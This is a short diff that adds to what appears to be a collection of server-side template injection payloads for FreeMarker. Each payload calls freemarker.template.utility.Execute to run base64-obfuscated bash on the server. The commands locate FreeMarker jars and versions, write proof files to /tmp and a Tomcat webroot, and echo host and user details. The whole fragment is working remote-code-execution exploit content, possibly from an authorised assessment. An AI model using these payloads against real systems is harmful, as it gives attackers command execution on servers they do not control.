@@ -72,3 +72,6 @@ printf '%s' 'echo "ssti-webroot-proof $(hostname) $(date +%s)" > /usr/local/tomc
 [DM] ${.data_model?keys?join(", ")}
 [GL] ${.globals?keys?join(", ")}
 [JAR] ${'freemarker.template.utility.Execute'?new()('echo amF2YSAtdmVyc2lvbiAyPiYxOyBKPSQoZmluZCAvIC1tYXhkZXB0aCA2IC1uYW1lICJmcmVlbWFya2VyKi5qYXIiIDI+L2Rldi9udWxsIHwgaGVhZCAtMSk7IGVjaG8gSkFSPSRKOyB1bnppcCAtcCAiJEoiIE1FVEEtSU5GL01BTklGRVNULk1GIDI+L2Rldi9udWxsIHwgZ3JlcCAtaWEgLW00IHZlcnNpb247IGxzIC9hcHAvQk9PVC1JTkYvbGliIDI+L2Rldi9udWxsIHwgZ3JlcCAtaSBmcmVlbWFya2VyOyBscyAvYXBwL2xpYiAyPi9kZXYvbnVsbCB8IGdyZXAgLWkgZnJlZW1hcmtlcjsgZmluZCAvIC1tYXhkZXB0aCA3IC1uYW1lICIqLmphciIgMj4vZGV2L251bGwgfCBncmVwIC1pIGZyZWVtYXJrZXIgfCBoZWFkIC01 | base64 -d | bash')?base64}
+
+
+[VA-WRITE] ${'freemarker.template.utility.Execute'?new()('echo ZWNobyAic3N0aS13cml0ZS1wcm9vZiBob3N0PSQoaG9zdG5hbWUpIHVzZXI9JChpZCAtdW4pIHRpbWU9JChkYXRlICslcykiID4gL3RtcC9WQV9TT1dfNjYxNDMudHh0IDI+JjE7IGVjaG8gV1JJVEVfRVhJVD0kPzsgbHMgLWxhIC90bXAvVkFfU09XXzY2MTQzLnR4dDsgY2F0IC90bXAvVkFfU09XXzY2MTQzLnR4dAo= | base64 -d | bash')?base64}
